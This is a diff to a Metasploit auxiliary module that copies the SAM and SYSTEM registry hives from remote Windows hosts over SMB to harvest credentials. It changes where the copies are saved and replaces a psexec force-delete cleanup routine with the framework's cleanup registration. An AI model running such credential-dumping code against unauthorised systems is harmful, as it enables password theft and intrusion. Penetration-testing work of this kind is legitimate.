@@ -56,8 +56,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main controller function
 	def run_host(ip)
-		sampath = "\\#{datastore['WINPATH']}\\#{Rex::Text.rand_text_alpha(20)}"
-		syspath = "\\#{datastore['WINPATH']}\\#{Rex::Text.rand_text_alpha(20)}"
+		sampath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
+		syspath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
 		logdir = datastore['LOGDIR']
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 			if save_reg_hives(ip, sampath, syspath)
-				[sampath, syspath].each { |file| register_file_for_delete(file) }
+				[sampath, syspath].each { |file| register_file_for_cleanup("#{datastore['SYSDRIVE']}\\#{file}") }
 				d = download_hives(smbshare, sampath, syspath, ip, logdir)
 				sys, sam = open_hives(logdir, ip, hives)
 				if d
@@ -125,20 +125,6 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
 			return nil
-		end
-	end
-
-
-	# This is the cleanup method.  deletes copies of the hive files from the windows temp directory
-	def cleanup_after(ip, sampath, syspath)
-		print_status("#{ip} - Running cleanup.")
-		begin
-			# Try and do cleanup
-			cleanup = "%COMSPEC% /C del /F /Q #{sampath} #{syspath}"
-			psexec(cleanup)
-		rescue StandardError => cleanerror
-			print_error("#{ip} - Unable to run cleanup, need to manually remove hive copies from windows temp directory: #{cleanerror}")
-			return cleanerror
 		end
 	end
 
